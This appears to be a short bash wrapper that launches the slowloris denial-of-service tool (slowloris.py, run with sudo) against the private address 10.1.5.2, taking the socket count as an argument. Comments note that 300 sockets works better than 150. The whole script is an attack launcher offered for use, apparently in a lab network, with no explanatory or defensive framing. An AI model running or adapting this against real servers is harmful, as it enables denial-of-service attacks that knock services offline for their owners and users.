#!/bin/bash

# 150 sockets, really slow
# 300 sockets, better

if [ $# -ge 1 ]
then
    if [ "$1" ]
    then
        echo "START SLOWLORIS"
        sudo python3 slowloris.py 10.1.5.2 --sockets $1 > /dev/null
    fi
else
    echo "YOU NEED TO SPECIFY SOCKS"
fi
